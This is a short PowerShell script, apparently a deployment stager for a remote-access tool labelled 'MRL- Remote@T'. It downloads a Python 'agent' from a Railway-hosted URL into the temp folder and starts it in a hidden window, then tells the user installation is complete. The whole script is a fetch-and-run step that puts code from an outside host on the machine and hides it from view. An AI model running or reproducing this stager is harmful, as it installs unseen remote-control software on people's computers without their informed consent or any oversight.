$url = "https://web-production-d6db5.up.railway.app/api/agent"
$dest = "$env:TEMP\ultimate_client.py"

Write-Host "MRL- Remote@T | Node Deployment" -ForegroundColor Cyan
Write-Host "Downloading agent software..."

try {
    Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
    Write-Host "Agent downloaded successfully to $dest" -ForegroundColor Green
} catch {
    Write-Host "Failed to download agent: $_" -ForegroundColor Red
    return
}

Write-Host "Initializing Remote Node..." -ForegroundColor Yellow

# Check if Python is installed
if (Get-Command python.exe -ErrorAction SilentlyContinue) {
    Write-Host "Starting agent via Python..." -ForegroundColor Green
    Start-Process python.exe -ArgumentList "$dest", "--no-update" -WindowStyle Hidden
} else {
    Write-Host "Python not found. Please install Python to run this node." -ForegroundColor Red
}

Write-Host "Installation Complete. You can close this window." -ForegroundColor Cyan
